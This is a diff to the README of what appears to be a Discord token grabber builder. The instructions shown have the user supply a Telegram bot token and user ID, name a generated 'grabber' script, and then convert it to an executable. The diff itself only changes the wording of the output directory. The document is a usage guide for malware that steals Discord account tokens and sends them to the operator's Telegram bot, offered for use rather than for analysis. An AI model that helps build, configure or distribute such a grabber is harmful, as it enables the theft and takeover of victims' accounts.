@@ -13,7 +13,7 @@
 2.  **Paste your Bot Token:** Get your bot token from [@BotFather](https://t.me/BotFather) on Telegram and paste it when prompted.
 3.  **Paste your User ID:** Obtain your numeric user ID from [@userinfobot](https://t.me/userinfobot) on Telegram and paste it when requested.
 4.  **Enter Grabber File Name:** Type the desired name for your generated grabber script (e.g., `grabber.py`).
-5.  **Grabber File Created Successfully:** The grabber file will be generated and saved in your project directory.
+5.  **Grabber File Created Successfully:** The grabber file will be generated and saved in your DiscordTokenGrabber directory.
 
 
 ## How To Convert to Executable (.exe)
